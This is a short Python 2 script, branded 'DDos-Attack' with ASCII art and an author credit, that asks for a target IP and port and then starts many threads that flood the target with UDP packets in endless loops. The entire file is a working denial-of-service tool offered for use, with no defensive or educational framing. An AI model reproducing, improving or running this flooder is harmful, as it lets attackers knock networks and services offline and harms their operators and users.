#!/usr/bin/python
# This code write by (Mr.nope)
# DDos Attack
from colorama import Fore,init
import time
import os
import sys
import socket
import thread
init()
def cls():
    os.system("clear")
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
def menu():
    os.system("printf '\033]2;DDos-Attack\a'")
    cls()
    print color.green + """
 ______   ______   _______  _______         _______  _______  _______  _______  _______  ___   _
|      | |      | |       ||       |       |   _   ||       ||       ||   _   ||       ||   | | |
|  _    ||  _    ||   _   ||  _____| ____  |  |_|  ||_     _||_     _||  |_|  ||       ||   |_| |
| | |   || | |   ||  | |  || |_____ |____| |       |  |   |    |   |  |       ||       ||      _|
| |_|   || |_|   ||  |_|  ||_____  |       |       |  |   |    |   |  |       ||      _||     |_
|       ||       ||       | _____| |       |   _   |  |   |    |   |  |   _   ||     |_ |    _  |
|______| |______| |_______||_______|       |__| |__|  |___|    |___|  |__| |__||_______||___| |_|\n""" + color.blue + """
     ----[    This code write by (Ms.nope)   ]---
     -------[ github :""" + color.blue + """ https://github.com/mrprogrammer2938/ ]-----------""" + color.End
    web = raw_input("\nEnter Target ip: ")
    time.sleep(1)
    port = input("\nEnter Target port: ")
    victim_ip = socket.gethostbyname(web)
    ##################################################
    UDP_PORT = port
    time.sleep(2)
    MESSAGE = "\nstarting DDos Attack... "
    time.sleep(1)
    os.system("clear")
    print color.red + "=============================================================================\n" + color.End
    print"Target IP:", victim_ip
    time.sleep(1)
    print"\nTarget port:", UDP_PORT
    color.red + "=============================================================================\n" + color.End
    time.sleep(3)
    def dos(i):
	    while True:
                      try:
                         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
                         print color.green + "\nThe package is sent to: " + color.red + web + color.End
                      except KeyboardInterrupt:
                          print"\nCtrl + C"
                          print"\nStoping DDosAttack...!"
                          sys.exit()
    for i in xrange(port):
            try:
               thread.start_new_thread( dos , ("Thread-"+str(i),) )
            except:
                   print"\nCtrl + C "
                   print"\nDDos-Attack Stoping...!"
                   sys.exit()

    try:
        while True:
            pass
    except:
        sys.exit()
if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        print "\nCtrl + C"
        print "\nExiting..."
        sys.exit()
# Thanks For using :)
